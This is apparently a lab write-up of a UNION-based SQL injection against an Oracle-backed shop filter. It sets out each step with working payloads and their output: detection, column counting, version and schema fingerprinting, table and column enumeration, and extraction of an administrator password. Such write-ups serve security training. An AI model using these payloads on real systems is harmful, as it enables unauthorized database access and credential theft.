# SQL injection attack, listing the database contents on Oracle

**Tags:** `UNION attack` · `Oracle` · `information_schema` · `credential extraction`

---

## 1. Detection

Navigated to `/filter?category=Gifts` and appended a single quote (`'`) to the category value. The server returned an **Internal Server Error**, confirming unsanitized input and likely no prepared statements — the value is wrapped in single quotes in the backend query.

Verified Boolean-based injection:

```sql
Gifts' AND 1=1--+   -- results returned
Gifts' AND 1=2--+  -- no results
```

<font style="color:yellow">[+] Note :-</font>
<b>OracleSQL always require `FROM`.</b>

---

## 2. Column count enumeration

Used `ORDER BY` to find the number of columns. Incrementing the index until `ORDER BY 3` threw an error, narrowing it to **2 columns**. The page also visually confirms this by showing only a title and description per item.

Confirmed both columns accept strings:

```sql
Gifts' UNION SELECT 'a','b' FROM DUAL--+
```

---

## 3. Database fingerprinting

Extracted the database version to identify the backend and craft compatible payloads:

```sql
Gifts' UNION SELECT banner,'b' FROM v$VERSION--+
```

**Output:**
```
CORE 11.2.0.2.0 Production
```

Further enumeration confirmed the database context:

```sql
Gifts' UNION SELECT ORA_DATABASE_NAME,'a' FROM DUAL--+
Gifts' UNION SELECT USER,'a' FROM DUAL--+
Gifts' UNION SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA'),'a' FROM DUAL--+
```


| Attribute      | Value |
|----------------|-------|
| Database       | XE    |
| User           | PETER |
| Current Schema | PETER |

---

## 4. Table and column discovery

Queried `user_tables` to list all user-created base tables in the schema:

```sql
Gifts' UNION SELECT TABLE_NAME,'a' FROM user_tables--+
```

**Tables found:**
```
PRODUCTS
USERS_YWUEIG
```

Extracted column names from the target table:

```sql
Gifts' UNION SELECT column_name,'a' FROM user_tab_columns WHERE table_name='USERS_YWUEIG'--+
```

**Columns found:**
```
EMAIL
USERNAME_GGLUVQ
PASSWORD_RXZANR
```

## 5. Credential extraction

Retrieved the administrator password by filtering on the known username column:

```sql
Gifts' UNION SELECT CONCAT(USERNAME_GGLUVQ,PASSWORD_RXZANR),'a' FROM USERS_YWUEIG WHERE USERNAME_GGLUVQ='administrator'--+
```

```sql
Gifts' UNION SELECT USERNAME_GGLUVQ || ':' || PASSWORD_RXZANR,'a' FROM USERS_YWUEIG WHERE USERNAME_GGLUVQ='administrator'--+
```

**Recovered credentials:**

| Field    | Value                  |
|----------|------------------------|
| Username | `administrator`        |
| Password | `isib8p01zr76jo2w5jid` |
